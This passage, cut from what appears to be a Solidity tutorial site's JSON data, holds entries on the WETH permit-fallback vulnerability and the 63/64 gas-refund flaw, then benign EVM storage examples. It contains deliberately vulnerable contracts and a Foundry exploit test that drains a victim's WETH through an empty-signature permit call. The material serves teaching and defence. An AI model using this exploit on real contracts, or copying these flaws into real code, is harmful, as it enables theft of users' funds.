    "content": "### Vulnerability\n\nMost ERC20 have the `permit` function to approve a spender if a valid signature is provided.\n\nHowever `WETH` does not. Surprisingly, when `permit` is called on `WETH`, the function call will execute without any errors.\n\nThis is because the `fallback` inside `WETH` is executed when `permit` is called.\n\n### Example\n\n0. Alice gives infinite approval for `ERC20Bank` to spend `WETH`\n1. Alice calls `deposit`, deposits 1 WETH into `ERC20Bank`\n2. Attacker calls `depositWithPermit`, passes an empty signature and transfers all tokens from Alice into `ERC20Bank`, crediting the attacker for the deposit.\n3. Attacker withdraws all tokens credited to him.\n\n### ERC20Bank\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./IERC20Permit.sol\";\n\ncontract ERC20Bank {\n    IERC20Permit public immutable token;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _token) {\n        token = IERC20Permit(_token);\n    }\n\n    function deposit(uint256 _amount) external {\n        token.transferFrom(msg.sender, address(this), _amount);\n        balanceOf[msg.sender] += _amount;\n    }\n\n    function depositWithPermit(\n        address owner,\n        address recipient,\n        uint256 amount,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        token.permit(owner, address(this), amount, deadline, v, r, s);\n        token.transferFrom(owner, address(this), amount);\n        balanceOf[recipient] += amount;\n    }\n\n    function withdraw(uint256 _amount) external {\n        balanceOf[msg.sender] -= _amount;\n        token.transfer(msg.sender, _amount);\n    }\n}\n\n```\n\n### Exploit\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {WETH} from \"../../../src/hacks/weth-permit/WETH.sol\";\nimport {ERC20Bank} from \"../../../src/hacks/weth-permit/ERC20Bank.sol\";\n\ncontract ERC20BankExploitTest is Test {\n    WETH private weth;\n    ERC20Bank private bank;\n    address private constant user = address(11);\n    address private constant attacker = address(12);\n\n    function setUp() public {\n        weth = new WETH();\n        bank = new ERC20Bank(address(weth));\n\n        deal(user, 100 * 1e18);\n        vm.startPrank(user);\n        weth.deposit{value: 100 * 1e18}();\n        weth.approve(address(bank), type(uint256).max);\n        bank.deposit(1e18);\n        vm.stopPrank();\n    }\n\n    function test() public {\n        uint256 bal = weth.balanceOf(user);\n        vm.startPrank(attacker);\n        bank.depositWithPermit(user, attacker, bal, 0, 0, \"\", \"\");\n        bank.withdraw(bal);\n        vm.stopPrank();\n\n        assertEq(weth.balanceOf(user), 0, \"WETH balance of user\");\n        assertEq(\n            weth.balanceOf(address(attacker)),\n            99 * 1e18,\n            \"WETH balance of attacker\"\n        );\n    }\n}\n\n```\n\n### Other contracts\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address dst, uint256 amount) external returns (bool);\n    function transferFrom(address src, address dst, uint256 amount)\n        external\n        returns (bool);\n\n    event Transfer(address indexed src, address indexed dst, uint256 amount);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 amount\n    );\n}\n\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./IERC20.sol\";\n\ninterface IERC20Permit is IERC20 {\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nabstract contract ERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 amount\n    );\n\n    string public name;\n    string public symbol;\n    uint8 public immutable decimals;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address to, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        balanceOf[msg.sender] -= amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        uint256 allowed = allowance[from][msg.sender];\n        if (allowed != type(uint256).max) {\n            allowance[from][msg.sender] = allowed - amount;\n        }\n        balanceOf[from] -= amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n        unchecked {\n            totalSupply -= amount;\n        }\n        emit Transfer(from, address(0), amount);\n    }\n}\n\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ERC20.sol\";\n\ncontract WETH is ERC20 {\n    event Deposit(address indexed account, uint256 amount);\n    event Withdraw(address indexed account, uint256 amount);\n\n    constructor() ERC20(\"Wrapped Ether\", \"WETH\", 18) {}\n\n    fallback() external payable {\n        deposit();\n    }\n\n    function deposit() public payable {\n        _mint(msg.sender, msg.value);\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    function withdraw(uint256 amount) external {\n        _burn(msg.sender, amount);\n        payable(msg.sender).transfer(amount);\n        emit Withdraw(msg.sender, amount);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ERC20.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nabstract contract ERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 amount\n    );\n\n    string public name;\n    string public symbol;\n    uint8 public immutable decimals;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address to, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        balanceOf[msg.sender] -= amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        uint256 allowed = allowance[from][msg.sender];\n        if (allowed != type(uint256).max) {\n            allowance[from][msg.sender] = allowed - amount;\n        }\n        balanceOf[from] -= amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n        unchecked {\n            totalSupply -= amount;\n        }\n        emit Transfer(from, address(0), amount);\n    }\n}\n"
      },
      {
        "fileName": "ERC20Bank.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./IERC20Permit.sol\";\n\ncontract ERC20Bank {\n    IERC20Permit public immutable token;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _token) {\n        token = IERC20Permit(_token);\n    }\n\n    function deposit(uint256 _amount) external {\n        token.transferFrom(msg.sender, address(this), _amount);\n        balanceOf[msg.sender] += _amount;\n    }\n\n    function depositWithPermit(\n        address owner,\n        address recipient,\n        uint256 amount,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        token.permit(owner, address(this), amount, deadline, v, r, s);\n        token.transferFrom(owner, address(this), amount);\n        balanceOf[recipient] += amount;\n    }\n\n    function withdraw(uint256 _amount) external {\n        balanceOf[msg.sender] -= _amount;\n        token.transfer(msg.sender, _amount);\n    }\n}\n"
      },
      {
        "fileName": "ERC20BankExploitTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {WETH} from \"../../../src/hacks/weth-permit/WETH.sol\";\nimport {ERC20Bank} from \"../../../src/hacks/weth-permit/ERC20Bank.sol\";\n\ncontract ERC20BankExploitTest is Test {\n    WETH private weth;\n    ERC20Bank private bank;\n    address private constant user = address(11);\n    address private constant attacker = address(12);\n\n    function setUp() public {\n        weth = new WETH();\n        bank = new ERC20Bank(address(weth));\n\n        deal(user, 100 * 1e18);\n        vm.startPrank(user);\n        weth.deposit{value: 100 * 1e18}();\n        weth.approve(address(bank), type(uint256).max);\n        bank.deposit(1e18);\n        vm.stopPrank();\n    }\n\n    function test() public {\n        uint256 bal = weth.balanceOf(user);\n        vm.startPrank(attacker);\n        bank.depositWithPermit(user, attacker, bal, 0, 0, \"\", \"\");\n        bank.withdraw(bal);\n        vm.stopPrank();\n\n        assertEq(weth.balanceOf(user), 0, \"WETH balance of user\");\n        assertEq(\n            weth.balanceOf(address(attacker)),\n            99 * 1e18,\n            \"WETH balance of attacker\"\n        );\n    }\n}\n"
      },
      {
        "fileName": "IERC20.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address dst, uint256 amount) external returns (bool);\n    function transferFrom(address src, address dst, uint256 amount)\n        external\n        returns (bool);\n\n    event Transfer(address indexed src, address indexed dst, uint256 amount);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 amount\n    );\n}\n"
      },
      {
        "fileName": "IERC20Permit.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./IERC20.sol\";\n\ninterface IERC20Permit is IERC20 {\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n"
      },
      {
        "fileName": "WETH.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ERC20.sol\";\n\ncontract WETH is ERC20 {\n    event Deposit(address indexed account, uint256 amount);\n    event Withdraw(address indexed account, uint256 amount);\n\n    constructor() ERC20(\"Wrapped Ether\", \"WETH\", 18) {}\n\n    fallback() external payable {\n        deposit();\n    }\n\n    function deposit() public payable {\n        _mint(msg.sender, msg.value);\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    function withdraw(uint256 amount) external {\n        _burn(msg.sender, amount);\n        payable(msg.sender).transfer(amount);\n        emit Withdraw(msg.sender, amount);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "weth",
      "permit"
    ],
    "order": 16
  },
  {
    "slug": "63-64-gas-rule",
    "title": "63 / 64 Gas Rule",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of 63 / 64 gas rule",
    "content": "According to 63 / 64 gas rule, external calls receive at most 63 / 64 of remaining gas in the calling contract.\n\n### Vulnerability\n\nContracts that refund gas used must account for this 1/64 gas that is not spent.\n\nHere is a simplified example of a contract that refunds gas.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract A {\n    function f(address b) external {\n        uint256 gasStart = gasleft();\n        B(payable(b)).g(msg.sender, gasStart);\n    }\n}\n\ncontract B {\n    event Log(uint256 gas);\n\n    mapping(address => bool) public authorized;\n\n    constructor() {\n        authorized[msg.sender] = true;\n    }\n\n    receive() external payable {}\n\n    function setAuth(address addr, bool auth) external {\n        require(authorized[msg.sender], \"not authorized\");\n        authorized[addr] = auth;\n    }\n\n    // Send 9000000000000000000 gas to drain ETH\n    function g(address receiver, uint256 gasStart) external {\n        require(authorized[msg.sender], \"not authorized\");\n\n        uint256 gasNow = gasleft();\n        uint256 gasUsed = gasStart - gasNow;\n        // Fix\n        //uint256 gasUsed = gasStart - (gasNow / 63) - gasNow;\n        (bool ok,) = receiver.call{value: gasUsed}(\"\");\n        require(ok, \"send failed\");\n\n        emit Log(gasUsed);\n    }\n}\n\n/*\n# 63 / 64 gas rule\nExternal calls receive max 63 / 64 of gas left in current contract\n1 / 64 gas is kept in the current contract\n\ng0 = call to gasleft() somewhere in A\ng1 = call to gasleft() somewhere in B\ng* = Actual gas left immediately before call to B\n\n  g*    63/64 g*\nA |---->| B\n|         |\ng0        g1\n\n# Gas used\ndg = gas used between g0 and g1\n   = g0 - g* + 63/64 g* - g1\n   = g0 - g1 - 1/64 g* >= 0\n\n# Problem\n- Refund of g0 - g1 over pays by 1/64 g*\n- g* can be large by sending large amount of gas\n\n# Fix\ng1 <= 63/64 g* <= g0\ng1/63 <= 1/64 g* <= g0/63\ng0 - g1 - g1/63 >= g0 - g1 - 1/64 g* >= g0 - g1 - 1/63 g0 = 62/63 g0 - g1\n                                     >= 0\n\nRefund g0 - g1 - g1/63\n*/\n\n```",
    "codes": [
      {
        "fileName": "Gas.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract A {\n    function f(address b) external {\n        uint256 gasStart = gasleft();\n        B(payable(b)).g(msg.sender, gasStart);\n    }\n}\n\ncontract B {\n    event Log(uint256 gas);\n\n    mapping(address => bool) public authorized;\n\n    constructor() {\n        authorized[msg.sender] = true;\n    }\n\n    receive() external payable {}\n\n    function setAuth(address addr, bool auth) external {\n        require(authorized[msg.sender], \"not authorized\");\n        authorized[addr] = auth;\n    }\n\n    // Send 9000000000000000000 gas to drain ETH\n    function g(address receiver, uint256 gasStart) external {\n        require(authorized[msg.sender], \"not authorized\");\n\n        uint256 gasNow = gasleft();\n        uint256 gasUsed = gasStart - gasNow;\n        // Fix\n        //uint256 gasUsed = gasStart - (gasNow / 63) - gasNow;\n        (bool ok,) = receiver.call{value: gasUsed}(\"\");\n        require(ok, \"send failed\");\n\n        emit Log(gasUsed);\n    }\n}\n\n/*\n# 63 / 64 gas rule\nExternal calls receive max 63 / 64 of gas left in current contract\n1 / 64 gas is kept in the current contract\n\ng0 = call to gasleft() somewhere in A\ng1 = call to gasleft() somewhere in B\ng* = Actual gas left immediately before call to B\n\n  g*    63/64 g*\nA |---->| B\n|         |\ng0        g1\n\n# Gas used\ndg = gas used between g0 and g1\n   = g0 - g* + 63/64 g* - g1\n   = g0 - g1 - 1/64 g* >= 0\n\n# Problem\n- Refund of g0 - g1 over pays by 1/64 g*\n- g* can be large by sending large amount of gas\n\n# Fix\ng1 <= 63/64 g* <= g0\ng1/63 <= 1/64 g* <= g0/63\ng0 - g1 - g1/63 >= g0 - g1 - 1/64 g* >= g0 - g1 - 1/63 g0 = 62/63 g0 - g1\n                                     >= 0\n\nRefund g0 - g1 - g1/63\n*/\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      63,
      64,
      "gas"
    ],
    "order": 17
  },
  {
    "slug": "storage",
    "title": "EVM Storage",
    "category": "EVM",
    "categorySlug": "evm",
    "description": "Example of EVM storage in Solidity",
    "content": "Examples of\n\n- Reading and writing to storage with `assembly`\n- Storage layout of different data types\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Yul - language used for Solidity inline assembly\ncontract YulIntro {\n    // Yul assignment\n    function test_yul_var() public pure returns (uint256) {\n        uint256 s = 0;\n\n        assembly {\n            // Declare variable\n            let x := 1\n            // Reassign\n            x := 2\n            // Assign to Solidity variable\n            s := 2\n        }\n\n        return s;\n    }\n\n    // Yul types (everything is bytes32)\n    function test_yul_types()\n        public\n        pure\n        returns (bool x, uint256 y, bytes32 z)\n    {\n        assembly {\n            x := 1\n            y := 0xaaa\n            z := \"Hello Yul\"\n        }\n\n        return (x, y, z);\n    }\n}\n\ncontract EVMStorageSingleSlot {\n    // EVM storage\n    // 2**256 slots, each slot can store up to 32 bytes\n    // Slots are assigned in the order the state variables are declared\n    // Data < 32 bytes are packed into a slot (right to left)\n    // sstore(k, v) = store v to slot k\n    // sload(k) = load 32 bytes from slot k\n\n    // Single variable stored in one slot\n    // slot 0\n    uint256 public s_x;\n    // slot 1\n    uint256 public s_y;\n    // slot 2\n    bytes32 public s_z;\n\n    function test_sstore() public {\n        assembly {\n            sstore(0, 111)\n            sstore(1, 222)\n            sstore(2, 0xababab)\n        }\n    }\n\n    function test_sstore_again() public {\n        // Access slot using .slot\n        assembly {\n            sstore(s_x.slot, 123)\n            sstore(s_y.slot, 456)\n            sstore(s_z.slot, 0xcdcdcd)\n        }\n    }\n\n    function test_sload()\n        public\n        view\n        returns (uint256 x, uint256 y, bytes32 z)\n    {\n        assembly {\n            x := sload(0)\n            y := sload(1)\n            z := sload(2)\n        }\n\n        return (x, y, z);\n    }\n\n    function test_sload_again()\n        public\n        view\n        returns (uint256 x, uint256 y, bytes32 z)\n    {\n        assembly {\n            x := sload(s_x.slot)\n            y := sload(s_y.slot)\n            z := sload(s_z.slot)\n        }\n\n        return (x, y, z);\n    }\n}\n\ncontract EVMStoragePackedSlotBytes {\n    // slot 0 (packed right to left)\n    bytes4 public b4 = 0xabababab;\n    bytes2 public b2 = 0xcdcd;\n\n    function get() public view returns (bytes32 b32) {\n        assembly {\n            b32 := sload(0)\n        }\n    }\n}\n\ncontract BitMasking {\n    function test_mask() public pure returns (bytes32 mask) {\n        assembly {\n            // |       256 bits        |\n            // 000 ... 000 | 111 ... 111\n            //             | 16 bits\n            // 0x000000000000000000000000000000000000000000000000000000000000ffff\n            mask := sub(shl(16, 1), 1)\n        }\n    }\n\n    function test_shift_mask() public pure returns (bytes32 mask) {\n        assembly {\n            // |               256 bits                |\n            // 000 ... 000 | 111 ... 111 | 000 ... 000 |\n            //             | 16 bits     | 32 bits\n            // 0x0000000000000000000000000000000000000000000000000000ffff00000000\n            mask := shl(32, sub(shl(16, 1), 1))\n        }\n    }\n\n    function test_not_mask() public pure returns (bytes32 mask) {\n        assembly {\n            // |               256 bits                |\n            // 111 ... 111 | 000 ... 000 | 111 ... 111 |\n            //             | 16 bits     | 32 bits\n            // 0xffffffffffffffffffffffffffffffffffffffffffffffffffff0000ffffffff\n            mask := not(shl(32, sub(shl(16, 1), 1)))\n        }\n    }\n}\n\ncontract EVMStoragePackedSlot {\n    // Data < 32 bytes are packed into a slot\n    // Bit masking (how to create 111...111)\n    // slot, offset\n\n    // slot 0\n    uint128 public s_a;\n    uint64 public s_b;\n    uint32 public s_c;\n    uint32 public s_d;\n    // slot 1\n    // 20 bytes = 160 bits\n    address public s_addr;\n    // 96 bits\n    uint64 public s_x;\n    uint32 public s_y;\n\n    function test_sstore() public {\n        assembly {\n            // Load 32 bytes from slot0\n            let v := sload(0)\n\n            // s_d | s_c | s_b | s_a\n            // 32  | 32  | 64  | 128 bits\n\n            // Set s_a = 11\n            // mask = all 1s at and to the left of 128 bit counting from right\n            //        111 ... 111 | 000 ... 000\n            //                    |    128 bits\n            let mask_a := not(sub(shl(128, 1), 1))\n            // Set left most 128 bits to 0\n            v := and(v, mask_a)\n            // Set s_a = 11\n            v := or(v, 11)\n\n            // Set s_b = 22\n            // mask = 111...111 | 000 ... 000 | 111 ... 111\n            //                  |     64 bits |    128 bits\n            let mask_b := not(shl(128, sub(shl(64, 1), 1)))\n            // Clear previous value of s_b by setting bits (128 to 191 bits) to 0\n            v := and(v, mask_b)\n            v := or(v, shl(128, 22))\n\n            // Set s_c = 33\n            // mask = 111...111 | 000...000 | 111 ... 111 | 111 ... 111\n            //                  |   32 bits |     64 bits |    128 bits\n            let mask_c := not(shl(192, sub(shl(32, 1), 1)))\n            // Clear previous value of s_c by setting bits (192 to 223 bits) to 0\n            v := and(v, mask_c)\n            v := or(v, shl(192, 33))\n\n            // Set s_d = 44\n            // mask = 000...000 | 111...111 | 111 ... 111 | 111 ... 111\n            //                  |   32 bits |     64 bits |    128 bits\n            let mask_d := not(shl(224, sub(shl(32, 1), 1)))\n            // Clear previous value of s_d by setting bits (224 to 255 bits) to 0\n            v := and(v, mask_d)\n            v := or(v, shl(224, 44))\n\n            // Store new value to slot0\n            sstore(0, v)\n        }\n    }\n\n    function test_slot_0_offset()\n        public\n        pure\n        returns (\n            uint256 a_offset,\n            uint256 b_offset,\n            uint256 c_offset,\n            uint256 d_offset\n        )\n    {\n        // a_offset =  0 =  0 * 8 =   0 bits\n        // b_offset = 16 = 16 * 8 = 128 bits\n        // c_offset = 24 = 24 * 8 = 192 bits\n        // d_offset = 28 = 28 * 8 = 224 bits\n        assembly {\n            a_offset := s_a.offset\n            b_offset := s_b.offset\n            c_offset := s_c.offset\n            d_offset := s_d.offset\n        }\n    }\n\n    function test_slot_1_offset()\n        public\n        pure\n        returns (uint256 addr_offset, uint256 x_offset, uint256 y_offset)\n    {\n        // addr_offset = 0\n        // x_offset = 20\n        // y_offset = 28\n        assembly {\n            addr_offset := s_addr.offset\n            x_offset := s_x.offset\n            y_offset := s_y.offset\n        }\n    }\n\n    // slot and offset\n    function test_sstore_using_offset() public {\n        // a_offset =  0 =  0 * 8 =   0 bits\n        // b_offset = 16 = 16 * 8 = 128 bits\n        // c_offset = 24 = 24 * 8 = 192 bits\n        // d_offset = 28 = 28 * 8 = 224 bits\n        assembly {\n            // Load 32 bytes from slot0\n            let v := sload(s_a.slot)\n\n            // s_d | s_c | s_b | s_a\n            // 32  | 32  | 64  | 128 bits\n\n            // Set s_a = 111\n            // mask = all 1s at and to the left of 128 bit counting from right\n            //        111 ... 111 | 000 ... 000\n            //                    |    128 bits\n            let mask_a := not(sub(shl(128, 1), 1))\n            // Set left most 128 bits to 0\n            v := and(v, mask_a)\n            // Set s_a = 1\n            v := or(v, 111)\n\n            // Set s_b = 222\n            // mask = 111...111 | 000 ... 000 | 111 ... 111\n            //                  |     64 bits |    128 bits\n            let mask_b := not(shl(mul(s_b.offset, 8), sub(shl(64, 1), 1)))\n            // Clear previous value of s_b by setting bits (128 to 191 bits) to 0\n            v := and(v, mask_b)\n            v := or(v, shl(mul(s_b.offset, 8), 222))\n\n            // Set s_c = 333\n            // mask = 111...111 | 000...000 | 111 ... 111 | 111 ... 111\n            //                  |   32 bits |     64 bits |    128 bits\n            let mask_c := not(shl(mul(s_c.offset, 8), sub(shl(32, 1), 1)))\n            // Clear previous value of s_c by setting bits (192 to 223 bits) to 0\n            v := and(v, mask_c)\n            v := or(v, shl(mul(s_c.offset, 8), 333))\n\n            // Set s_d = 444\n            // mask = 000...000 | 111...111 | 111 ... 111 | 111 ... 111\n            //                  |   32 bits |     64 bits |    128 bits\n            let mask_d := not(shl(mul(s_d.offset, 8), sub(shl(32, 1), 1)))\n            // Clear previous value of s_d by setting bits (224 to 255 bits) to 0\n            v := and(v, mask_d)\n            v := or(v, shl(mul(s_d.offset, 8), 444))\n\n            // Store new value to slot0\n            sstore(s_a.slot, v)\n        }\n    }\n}\n\ncontract EVMStorageStruct {\n    struct SingleSlot {\n        uint128 x;\n        uint64 y;\n        uint64 z;\n    }\n\n    struct MultipleSlots {\n        uint256 a;\n        uint256 b;\n        uint256 c;\n    }\n\n    // slot 0\n    SingleSlot public single = SingleSlot({x: 1, y: 2, z: 3});\n    // slot 1, 2, 3\n    MultipleSlots public multi = MultipleSlots({a: 11, b: 22, c: 33});\n\n    function test_get_single_slot_struct()\n        public\n        view\n        returns (uint128 x, uint64 y, uint64 z)\n    {\n        assembly {\n            let s := sload(0)\n            //  z |  y | x\n            // 64 | 64 | 128 bits\n            // Casting cuts off bits to the left\n            x := s\n            y := shr(128, s)\n            z := shr(192, s)\n        }\n    }\n\n    function test_get_multiple_slots_struct()\n        public\n        view\n        returns (uint256 a, uint256 b, uint256 c)\n    {\n        assembly {\n            a := sload(1)\n            b := sload(2)\n            c := sload(3)\n        }\n    }\n}\n\ncontract EVMStorageConstants {\n    // slot 0\n    uint256 public s0 = 1;\n    // Constants and immutables don't use storage\n    uint256 public constant X = 123;\n    address public immutable owner;\n    // slot 1\n    uint256 public s1 = 2;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function test_get_slots() public view returns (uint256 v0, uint256 v1) {\n        assembly {\n            v0 := sload(0)\n            v1 := sload(1)\n        }\n    }\n}\n\ncontract EVMStorageFixedArray {\n    // Fixed array with elements = 32 bytes, slot of element = slot where array is declared + index of array element\n    // slots 0, 1, 2\n    uint256[3] private arr_0 = [1, 2, 3];\n    // slots 3, 4, 5\n    uint256[3] private arr_1 = [4, 5, 6];\n    // slot + index of packed data\n    // slots 6, 6, 7, 7, 8\n    uint128[5] private arr_2 = [7, 8, 9, 10, 11];\n\n    function test_arr_0(uint256 i) public view returns (uint256 v) {\n        assembly {\n            // arr_0 starts from slot 0\n            v := sload(add(0, i))\n        }\n    }\n\n    function test_arr_1(uint256 i) public view returns (uint256 v) {\n        assembly {\n            // arr_1 starts from slot 3\n            v := sload(add(3, i))\n        }\n    }\n\n    function test_arr_2(uint256 i) public view returns (uint128 v) {\n        assembly {\n            // arr_2 starts from slot 6\n            let b32 := sload(add(6, div(i, 2)))\n            // slot 6 = 1st element | 0th element\n            // slot 7 = 3rd element | 2nd element\n            // slot 8 = 000 ... 000 | 4th element\n\n            // i is even => get right 128 bits => cast bytes32 to uint128 (cut off left 128 bits)\n            // i is odd  => get left 128 bits  => shift right 128 bits\n\n            switch mod(i, 2)\n            case 1 { v := shr(128, b32) }\n            default { v := b32 }\n        }\n    }\n}\n\ncontract EVMStorageDynamicArray {\n    // slot of element = keccak256(slot where this array is declared) + size of element * index of element\n    // keccak256(0) + 1 * index\n    uint256[] private arr = [11, 22, 33];\n    // keccak256(1) + 1 / 2 * index\n    uint128[] private arr_2 = [1, 2, 3];\n\n    function test_arr(uint256 slot, uint256 i)\n        public\n        view\n        returns (uint256 v, bytes32 b32, uint256 len)\n    {\n        bytes32 start = keccak256(abi.encode(slot));\n\n        assembly {\n            len := sload(slot)\n            v := sload(add(start, i))\n            b32 := v\n        }\n    }\n}\n\ncontract EVMStorageMapping {\n    // slot of value = keccak256(key, slot where mapping is declared)\n    mapping(address => uint256) public map;\n\n    address public constant ADDR_1 = address(1);\n    address public constant ADDR_2 = address(2);\n    address public constant ADDR_3 = address(3);\n\n    constructor() {\n        map[ADDR_1] = 11;\n        map[ADDR_2] = 22;\n        map[ADDR_3] = 33;\n    }\n\n    function test_mapping(address key) public view returns (uint256 v) {\n        uint256 slot = 0;\n        bytes32 slot_v = keccak256(abi.encode(key, slot));\n\n        assembly {\n            v := sload(slot_v)\n        }\n    }\n}\n\ncontract EVMStorageNestedMapping {\n    // key0 => key1 => val\n    // slot of value = keccak256(key1, keccak256(key0, slot where nested mapping is declared))\n    mapping(address => mapping(address => uint256)) public map;\n\n    address public constant ADDR_1 = address(1);\n    address public constant ADDR_2 = address(2);\n    address public constant ADDR_3 = address(3);\n\n    constructor() {\n        map[ADDR_1][ADDR_2] = 11;\n        map[ADDR_2][ADDR_3] = 22;\n        map[ADDR_3][ADDR_1] = 33;\n    }\n\n    function test_nested_mapping(address key_0, address key_1)\n        public\n        view\n        returns (uint256 v)\n    {\n        uint256 slot = 0;\n        bytes32 s0 = keccak256(abi.encode(key_0, slot));\n        bytes32 s1 = keccak256(abi.encode(key_1, s0));\n\n        assembly {\n            v := sload(s1)\n        }\n    }\n}\n\ncontract EVMStorageMappingArray {\n    // slot of value in a mapping = keccak256(key, slot)\n    // slot of array element = keccak256(slot) + index\n    // mapping -> array -> keccak256(keccak256(key, slot of map declaration)) + index\n    mapping(address => uint256[]) public map;\n\n    address public constant ADDR_1 = address(1);\n    address public constant ADDR_2 = address(2);\n\n    constructor() {\n        map[ADDR_1].push(11);\n        map[ADDR_1].push(22);\n        map[ADDR_1].push(33);\n        map[ADDR_2].push(44);\n        map[ADDR_2].push(55);\n        map[ADDR_2].push(66);\n    }\n\n    function test_map_arr(address addr, uint256 i)\n        public\n        view\n        returns (uint256 v, uint256 len)\n    {\n        uint256 map_slot = 0;\n        bytes32 map_hash = keccak256(abi.encode(addr, map_slot));\n        bytes32 arr_hash = keccak256(abi.encode(map_hash));\n\n        assembly {\n            len := sload(map_hash)\n            v := sload(add(arr_hash, i))\n        }\n    }\n}\n\ncontract EVMStorageDynamicArrayStruct {\n    struct Point {\n        uint256 x;\n        uint128 y;\n        uint128 z;\n    }\n\n    // slot of element = keccak256(slot where this array is declared) + index of element\n    // keccak256(0) + index * size of struct\n    Point[] private arr;\n\n    constructor() {\n        arr.push(Point(11, 22, 33));\n        arr.push(Point(44, 55, 66));\n        arr.push(Point(77, 88, 99));\n    }\n\n    function test_struct_arr(uint256 i)\n        public\n        view\n        returns (uint256 x, uint128 y, uint128 z, uint256 len)\n    {\n        uint256 slot = 0;\n        bytes32 start = keccak256(abi.encode(slot));\n\n        assembly {\n            len := sload(slot)\n            // s0 = keccak256(0)\n            // index | slot        | values\n            //     0 | slot s0 + 0 | arr[0].x\n            //     0 | slot s0 + 1 | arr[0].z | arr[0].y\n            //     1 | slot s0 + 